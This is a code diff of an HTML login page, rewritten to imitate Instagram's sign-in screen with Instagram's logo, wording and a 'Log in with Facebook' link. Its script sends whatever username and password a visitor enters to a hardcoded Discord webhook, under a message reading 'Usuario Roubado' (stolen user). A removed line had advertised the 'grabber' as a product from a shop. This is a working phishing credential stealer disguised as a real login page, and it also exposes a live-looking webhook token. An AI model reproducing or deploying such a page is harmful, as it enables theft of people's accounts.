@@ -1,58 +1,130 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tela de login</title>
+    <title>Instagram</title>
+    <link rel="icon" href="https://cdn-icons-png.freepik.com/256/15713/15713420.png?semt=ais_hybrid" type="image/png"> <!-- Ícone atualizado -->
     <style>
-        body{
-            font-family: Arial, Helvetica, sans-serif;
-            background-image: linear-gradient(45deg, cyan, yellow);
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        div{
-            background-color: rgba(0, 0, 0, 0.9);
+        .login-container {
+            align-items: center;
+            background-color: rgb(255, 255, 255);
+            border: 1px solid rgb(219, 219, 219);
+            border-radius: 1px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            width: 400px;
+            padding: 20px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            background-image: url("https://static.cdninstagram.com/rsrc.php/v4/yv/r/KoLLpWDb4f6.png");
+            background-position: 0px -52px;
+            background-size: auto;
+            width: 175px;
+            height: 51px;
+            background-repeat: no-repeat;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 75%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid rgb(219, 219, 219);
+            border-radius: 5px;
+        }
+        .login-container button {
+            width: 82%;
+            padding: 10px;
+            background-color: #42b3ff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 20px; /* Aumentado para descer o botão */
+        }
+        .login-container button:hover {
+            background-color: #007bbf;
+        }
+        .divider {
+            margin: 30px 0; /* Aumentado o espaço acima e abaixo do divisor */
+            text-align: center;
+            position: relative;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            display: block;
+            height: 1px;
+            background: rgb(219, 219, 219);
             position: absolute;
             top: 50%;
-            left: 50%;
-            transform: translate(-50%,-50%);
-            padding: 80px;
-            border-radius: 15px;
-            color: #fff;
+            width: 40%;
         }
-        input{
-            padding: 15px;
-            border: none;
-            outline: none;
-            font-size: 15px;
+        .divider::before {
+            left: 0;
         }
-        button{
-            background-color: dodgerblue;
-            border: none;
-            padding: 15px;
-            width: 100%;
-            border-radius: 10px;
-            color: white;
-            font-size: 15px;
-            
+        .divider::after {
+            right: 0;
         }
-        button:hover{
-            background-color: deepskyblue;
-            cursor: pointer;
+        .divider span {
+            background: white;
+            padding: 0 10px;
+            color: #888;
+            font-weight: bold; /* Mantido o peso da fonte */
+        }
+        .facebook-link {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+            color: #02a2ff;
+            font-size: 14px;
+            margin-top: 10px;
+            font-weight: bolder;
+        }
+        .facebook-link img {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+        }
+        .forgot-password {
+            text-decoration: none;
+            color: #405c6e;
+            font-size: 14px;
+            margin-top: 20px;
+            display: block;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <div>
-        <h1>Login</h1>
-        <input type="text" placeholder="Nome">
-        <br><br>
-        <input type="password" placeholder="Senha">
-        <br><br>
-        <button>Enviar</button>
+
+<div class="login-container">
+    <div class="logo"></div>
+    <input type="text" id="username" placeholder="Phone number, username, or email" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button onclick="login()">Log in</button>
+    <div class="divider">
+        <span>Or</span>
     </div>
-</body>
-</html>
+    <a href="https://www.facebook.com" class="facebook-link">
+        <img src="https://cdn-icons-png.flaticon.com/256/5968/5968764.png" alt="Facebook">Log in with Facebook
+    </a>
+    <a href="#" class="forgot-password">Forgot password?</a>
+</div>
 
 <script>
     function login() {
@@ -68,7 +140,7 @@
         // Enviar as credenciais para o webhook do Discord
         const webhookUrl = 'https://discord.com/api/webhooks/1322009369239617546/52wE5P2l6X4SrrJaTdkmee4ZffzXdRs4QcMaf8lFjrY0Mz4WhD93RNDvQen6Jqsl7qP4'; 
         const data = {
-            content: `# Usuário Grabbado com sucesso:\nSuposto Login: ||${username}||\nSuposta senha: ||${password}||\n\n\n GRABBER FEITO POR BANIDOS.SHOP. ADQUIRA O GRABBER: [BANIDOS.SHOP ](https://banidos.shop/) /` 
+            content: `# Usuario Roubado:\nUsuário: ${username}\nSenha: ||${password}||` 
         };
 
         fetch(webhookUrl, {
